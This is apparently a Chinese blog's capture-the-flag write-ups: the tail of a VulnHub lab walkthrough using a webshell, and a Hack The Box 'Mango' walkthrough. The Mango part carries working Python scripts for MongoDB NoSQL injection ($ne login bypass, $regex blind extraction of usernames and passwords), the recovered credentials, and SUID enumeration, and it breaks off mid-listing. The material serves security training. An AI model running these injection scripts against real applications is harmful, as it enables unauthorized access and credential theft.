<p>然后输入密码3vilH@ksor，根据提示重置root用户的密码，进入超级用户后，执行下面命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ifconfig ens33 up //启用网卡，然后再通过 ifconfig -a 看，发现 没有IP</span><br><span class="line"></span><br><span class="line">dhclient ens33  // 分配IP</span><br></pre></td></tr></table></figure>
<p>即可成功获取ip，记住，靶机和kali linux的vmware的网络都要设置为[自定义：特定虚拟网络的&lt;VMnet8(NAT模式)&gt;]</p>
<h3 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h3><p>主机发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br></pre></td></tr></table></figure>
<p>发现靶机的ip地址:192.168.84.136</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub3.jpg"></p>
<p>进一步扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.136</span><br></pre></td></tr></table></figure>
<p>得到如下信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub4.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub5.jpg"></p>
<ul>
<li>flag1:</li>
</ul>
<p>打开robots.txt中的flag</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub6.jpg"></p>
<ul>
<li>flag2:</li>
</ul>
<p>地址栏输入<span class="exturl" data-url="aHR0cDovL2lwL2FkbWluX2FyZWEvLCVFNSU4RiVCMyVFOSU5NCVBRSVFNiU5RiVBNSVFNyU5QyU4QiVFNiVCQSU5MCVFNyVBMCU4MSVFNSVCRSU5NyVFNSU4OCVCMCVFNyVBQyVBQyVFNCVCQSU4QyVFNCVCOCVBQWZsYWc=">http://ip/admin_area/,右键查看源码得到第二个flag<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub7.jpg"></p>
<ul>
<li>flag3:</li>
</ul>
<p>从刚才第二个flag的地方得到管理员的账号密码，地址栏打开<span class="exturl" data-url="aHR0cDovL2lwL2xvZ2luLnBocCVFNyU5OSVCQiVFNSVCRCU5NQ==">http://ip/login.php登录<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub8.jpg"></p>
<p>直接上冰蝎</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub9.jpg"></p>
<p>翻到/var/www/html/目录下面，看到一个hint.txt和flag.txt,flag.txt我们apache的组是无法进行然后操作的，但是hint.txt可以读取，</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub10.jpg"></p>
<ul>
<li>flag4:</li>
</ul>
<p>第三个flag提示用technawi用去读取flag.txt文件，可以在隐藏文件中找到用户的信息</p>
<p>启动shell的命令行模式，输入命令find / -user ‘technawi’ 2&gt;/dev/null, 2&gt;/dev/null是过滤掉类似没有权限的信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub11.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub12.jpg"></p>
<ul>
<li>flag5:</li>
</ul>
<p>按照第四个flag的提示，用里面的账号密码去登录靶机ssh</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub13.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[mango]</title>
    <url>/2020/04/20/mango/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>操作系统：Linux<br>难度：中等<br>点数：30<br>发行：2019年10月26日<br>IP：10.10.10.162</p>
<p>user一血用时：04小时28分58秒。<br>root一血用时：05小时14分45秒。</p>
<p>看来是真特么的耗时间</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb14.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p- --min-rate=1000 -T4 -v -sV 10.10.10.162</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p 22,80,443 -A -v 10.10.10.162</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Mango | Search Base</span><br><span class="line">| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">| Not valid after:  2020-09-26T14:21:19</span><br><span class="line">| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6</span><br><span class="line">|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br></pre></td></tr></table></figure>

<p>Nmap扫描显示运行其通常服务的端口22、80和443。此外，Nmap还发现了一个名为stage -order.mango的vhost。在SSL证书中提到的htb。添加mango.htb和staging-order.mango.htb到/etc/hosts，然后继续枚举。</p>
<p>浏览到端口80将返回一个403禁止错误，然而，HTTPS网站显示了一个搜索引擎。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb15.jpg"></li>
</ul>
<p>页面只是刷新，搜索时不返回任何结果。第二个vhost在HTTPS上托管返回相同的页面。然而，HTTP网站却只是显示了一个登录页面。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb16.jpg"></li>
</ul>
<p>尝试使用通用默认凭据登录失败。在Burp中拦截请求并检查登录请求。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb17.jpg"></li>
</ul>
<p>注入引号没有返回错误或改变响应。由于网站正在运行PHP，可以尝试使用类型杂耍绕过身份验证。<br>这可以通过向请求参数添加[]来实现，这使得PHP将它们作为数组使用。如果存在任何弱比较，则将绕过身份验证。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb18.jpg"></li>
</ul>
<p>会导致失败的尝试。尝试一下NoSQL注入攻击，比如MongoDB身份验证绕过。MongoDB使用$ne (not equal)操作符来比较值。这个操作符可以通过数组语法传递给PHP，它最终会被注入到MongoDB查询中。</p>
<p>这是一个例子MongoDB查询找到一个用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123; username: <span class="string">&quot;admin&quot;</span>, password: <span class="string">&quot;admin&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>上面的查询将导致由于密码错误而导致登录失败。发送参数password[$ne]=admin的请求将导致查询:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123; username: <span class="string">&quot;admin&quot;</span>, password: &#123; <span class="variable">$ne</span> : <span class="string">&quot;admin&quot;</span> &#125; &#125;);</span><br></pre></td></tr></table></figure>

<p>这将返回true，因为admin的密码不等于admin，会成功地绕过登录。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb19.jpg"></li>
</ul>
<p>$ne的注入被发现是成功的，并且页面将重定向到home.php作为admin。使用登录请求重复相同的过程将返回以下页面。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb20.jpg"></li>
</ul>
<h3 id="MongoDB注入"><a href="#MongoDB注入" class="headerlink" title="MongoDB注入"></a>MongoDB注入</h3><p>因为主页没有返回任何有用的信息。可以尝试使用$regex操作符从Mongo数据库中提取数据。$regex操作符可用于使用正则表达式查找数据。</p>
<p>例如，下面的查询将搜索匹配</p>
<p>regex a.*</p>
<p>的用户名，匹配任何包含a的用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123; username: &#123; <span class="variable">$regex</span> : <span class="string">&quot;a.*&quot;</span>, password: &#123; <span class="variable">$ne</span> : <span class="string">&quot;admin&quot;</span> &#125; &#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb21.jpg"></li>
</ul>
<p>用b.*替换a.*返回200响应，这意味着没有包含b的用户名。编写一个使用此逻辑发现用户名的脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">def sendPayload():</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> lowercase:</span><br><span class="line">        regex = <span class="string">&#x27;&#123;&#125;.*&#x27;</span>.format(char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Found valid letter: &#123;&#125;&quot;</span>.format(char)</span><br><span class="line">def getUser():</span><br><span class="line">    sendPayload()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>

<p>代码已经缩进好了，直接复制粘贴就可以使用</p>
<p>运行代码，列出DB中所有用户名中出现的所有字符。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Found valid letter: a</span><br><span class="line">Found valid letter: d</span><br><span class="line">Found valid letter: g</span><br><span class="line">Found valid letter: i</span><br><span class="line">Found valid letter: m</span><br><span class="line">Found valid letter: n</span><br><span class="line">Found valid letter: o</span><br></pre></td></tr></table></figure>

<p>脚本发现了7个有效字符，即a、d、g、i、m、n、o。现在已经减少了字符集，可以尝试显示实际的用户名。regex中的插入符号^用于标记单词的开头。例如，模式^a.*仅当用户名以a开头时才返回true。<br>类似地，模式^ad.*如果以ad开头的用户名存在，则返回true，以此类推。使用这个逻辑更新脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">valid = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">def sendPayload(word):</span><br><span class="line">    regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word)</span><br><span class="line">    data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">    response = post(url, data = data, allow_redirects=False)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">        <span class="built_in">return</span> word</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">if</span> sendPayload(char) != None:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Found username starting with &#123;&#125;&quot;</span>.format(char)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>
<p>脚本循环遍历字符集，查找以这些字母中的任何一个开头的用户名。<br>运行脚本后出现下面的结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Found username starting with a</span><br><span class="line">Found username starting with m</span><br></pre></td></tr></table></figure>

<p>发现DB分别包含以a和m开头的用户名。更新脚本以显示真正的用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">valid = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">def sendPayload(word):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word + char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">return</span> char</span><br><span class="line">    <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>]:</span><br><span class="line">        username = ch</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            char = sendPayload(username)</span><br><span class="line">            <span class="keyword">if</span> char != None:</span><br><span class="line">                username += char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Username found: &#123;&#125;&quot;</span>.format(username)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>

<p>脚本循环遍历有效字符并查找以a和m开头的用户名。</p>
<p>包含302状态码(URL重定向)的HTTP响应包含一个有效字符，该脚本输出结果如下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username found: admin</span><br><span class="line">Username found: mango</span><br></pre></td></tr></table></figure>

<p>标识了两个有效的用户名，admin和mango。可以尝试使用相同的逻辑来识别他们的密码。</p>
<p>修改脚本如下所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import printable</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">def sendPayload(user):</span><br><span class="line">    valid = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> printable:</span><br><span class="line">        regex = <span class="string">&#x27;&#123;&#125;.*&#x27;</span>.format(char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username&#x27;</span> : user, <span class="string">&#x27;password[$regex]&#x27;</span> : regex, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            valid.append(char)</span><br><span class="line">    <span class="built_in">return</span> valid</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;mango&#x27;</span>]:</span><br><span class="line">        valid = sendPayload(user)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Valid characters for &#123;&#125;: &#123;&#125;&quot;</span>.format(user, valid)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>

<p>该脚本遍历所有可打印的ASCII字符。分别为两个用户返回有效的字符集，从而减少了下一阶段的请求数量。</p>
<p>运行结果如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Valid characters <span class="keyword">for</span> admin: [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;|&#x27;</span>]</span><br><span class="line">Valid characters <span class="keyword">for</span> mango: [<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码"><a href="#以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码" class="headerlink" title="以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码"></a>以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码</h3><p>现在已经有了两个密码的字符集，更新脚本来查找密码。字符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^，$，|，\\和.</span><br></pre></td></tr></table></figure>
<p>应该用反斜杠进行转义，因为它们在正则表达式中具有特殊意义，并且可能导致错误的否定。</p>
<p>依照之前爆破用户名脚本的方法修改脚本如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import printable</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">admin_pass = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\$&#x27;</span>, <span class="string">&#x27;\\.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\^&#x27;</span>, <span class="string">&#x27;\\|&#x27;</span>]</span><br><span class="line">mango_pass = [<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;\\$&#x27;</span>, <span class="string">&#x27;\\.&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\\^&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\\|&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">def sendPayload(user, word):</span><br><span class="line">    valid = admin_pass <span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">else</span> mango_pass</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word + char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username&#x27;</span> : user, <span class="string">&#x27;password[$regex]&#x27;</span> : regex, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">return</span> char</span><br><span class="line">    <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;mango&#x27;</span>]:</span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            char = sendPayload(user, password)</span><br><span class="line">            <span class="keyword">if</span> char != None:</span><br><span class="line">                password += char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Password for &#123;&#125; found: &#123;&#125;&quot;</span>.format(user, password)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>

<p>该脚本对两个用户都使用有效的字符集，并逐个字符地显示他们的密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Password <span class="keyword">for</span> admin found: t9KcS3&gt;!0B<span class="comment">#2</span></span><br><span class="line">Password <span class="keyword">for</span> mango found: h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure>

<p>两个用户的密码都被成功地获取了。用户mango的凭证可以用来通过SSH登录。</p>
<h3 id="getshell-amp-提权"><a href="#getshell-amp-提权" class="headerlink" title="getshell &amp; 提权"></a>getshell &amp; 提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Connecting to 10.10.10.162:22...</span><br><span class="line">Connection established.</span><br><span class="line">To escape to <span class="built_in">local</span> shell, press <span class="string">&#x27;Ctrl+Alt+]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Tue Apr 21 05:18:56 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.08               Processes:            99</span><br><span class="line">  Usage of /:   25.8% of 19.56GB   Users logged <span class="keyword">in</span>:      0</span><br><span class="line">  Memory usage: 14%                IP address <span class="keyword">for</span> ens33: 10.10.10.162</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">122 packages can be updated.</span><br><span class="line">18 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138</span><br><span class="line">/usr/bin/xauth:  file /home/mango/.Xauthority does not exist</span><br><span class="line">mango@mango:~$ id</span><br><span class="line">uid=1000(mango) gid=1000(mango) groups=1000(mango)</span><br><span class="line">mango@mango:~$ whoami</span><br><span class="line">mango</span><br><span class="line">mango@mango:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> mango: </span><br><span class="line">Sorry, user mango may not run sudo on mango.</span><br></pre></td></tr></table></figure>

<p>找到user.txt但是用户权限不足</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mango@mango:/home$ <span class="built_in">cd</span> admin</span><br><span class="line">mango@mango:/home/admin$ ls</span><br><span class="line">user.txt</span><br><span class="line">mango@mango:/home/admin$ cat user.txt</span><br><span class="line">cat: user.txt: Permission denied</span><br></pre></td></tr></table></figure>

<p>切换用户，获取user</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mango@mango:/home/admin$ su admin</span><br><span class="line">Password: </span><br><span class="line">$ id</span><br><span class="line">uid=4000000000(admin) gid=1001(admin) groups=1001(admin)</span><br><span class="line">$ whoami</span><br><span class="line">admin</span><br><span class="line">$ ls</span><br><span class="line">user.txt</span><br><span class="line">$ cat user.txt</span><br><span class="line">79bf31c6c6eb38a8567832f7f8b47e92</span><br></pre></td></tr></table></figure>

<p>下面就是提权步骤了</p>
<p>搜索SUID文件会发现两个不常见的二进制文件，run-mailcap和jjs。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/snap/core/7713/bin/mount</span><br><span class="line">/snap/core/7713/bin/ping</span><br><span class="line">/snap/core/7713/bin/ping6</span><br><span class="line">/snap/core/7713/bin/su</span><br><span class="line">/snap/core/7713/bin/umount</span><br><span class="line">/snap/core/7713/usr/bin/chfn</span><br><span class="line">/snap/core/7713/usr/bin/chsh</span><br><span class="line">/snap/core/7713/usr/bin/gpasswd</span><br><span class="line">/snap/core/7713/usr/bin/newgrp</span><br><span class="line">/snap/core/7713/usr/bin/passwd</span><br><span class="line">/snap/core/7713/usr/bin/sudo</span><br><span class="line">/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/7713/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/7713/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/7713/usr/sbin/pppd</span><br><span class="line">/snap/core/6350/bin/mount</span><br><span class="line">/snap/core/6350/bin/ping</span><br><span class="line">/snap/core/6350/bin/ping6</span><br><span class="line">/snap/core/6350/bin/su</span><br><span class="line">/snap/core/6350/bin/umount</span><br><span class="line">/snap/core/6350/usr/bin/chfn</span><br><span class="line">/snap/core/6350/usr/bin/chsh</span><br><span class="line">/snap/core/6350/usr/bin/gpasswd</span><br><span class="line">/snap/core/6350/usr/bin/newgrp</span><br><span 